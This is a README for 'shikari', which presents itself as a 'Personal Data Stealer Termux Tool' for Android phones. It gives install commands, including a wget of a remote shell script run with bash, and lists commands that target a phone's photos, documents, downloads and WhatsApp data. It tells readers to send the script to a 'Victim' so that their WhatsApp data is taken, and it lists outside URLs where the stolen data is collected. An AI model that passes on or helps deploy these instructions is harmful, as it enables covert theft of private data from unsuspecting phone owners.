<p align="center">
<a href="#"><img title="succeed" src="https://img.shields.io/badge/deobfuscating-succeed-green?colorB=%23017e40&style=for-the-badge"></a>
</p>
<p align="left">
<a href="https://github.com/hax0rtahm1d"><img title="HaX0r Tahm1d" src="https://img.shields.io/badge/By-HaX0r%20Tahm1d-blue?style=for-the-badge&logo=github"></a>
</p>
<br/><br/>

<!--
https://pypi.org/project/shikari/
https://pypi.org/project/shikari/
-->

[![](https://img.shields.io/pypi/pyversions/readme-generator.svg?longCache=True)](https://pypi.org/project/readme-generator/)
<br><br>
#### Installation
$ pip install shikari

or

$ wget https://raw.githubusercontent.com/Bhai4You/Shikari/master/shikari.sh;bash shikari.sh

<br><br>

#### Features
+   **shikari**, Personal Data Stealer Termux Tool
<br><br>
#### Screenshot :
<a href="https://ibb.co/1sjMwKF"><img src="https://i.ibb.co/1sjMwKF/ss1.jpg" alt="ss1" border="0"></a>
<a href="https://ibb.co/YPg0dp7"><img src="https://i.ibb.co/YPg0dp7/ss2.jpg" alt="ss2" border="0"></a>
<br><br>

#### How to Use
+   **pip install shikari**
+   **shikari-whatsapp**

Paste this two code in Termux Script and Send to your Victim !! then Shikari Automatically Shikar and Hack Victim whatsapp Data ^^

<br><br>

#### Menu Options :

$ shikari

shikari-home<br>
shikari-dcim<br>
shikari-doc<br>
shikari-pic<br>
shikari-download<br>
shikari-whatsapp<br>
shikari-movie<br>
<br>
Created by Parixit Sutariya<br>
Github : github.com/Bhai4You<br>
Youtube : youtube.com/BullAnonymous<br>


<br><br>
#### How to Hack Whatsapp ?

$ shikari-whatsapp

Created by Parixit Sutariya
Github : github.com/Bhai4You
Youtube : youtube.com/BullAnonymous

<br><br>
#### How to Download Shikari Data ?
http://scnc.co.za/shikari.txt<br>
http://ayk.co.za/shikari.txt<br>
http://foodconsult.co.za/shikari.txt<br>

<p align="center">
    <a href="https://pypi.org/project/shikari/">Shikari Tool</a>
</p>
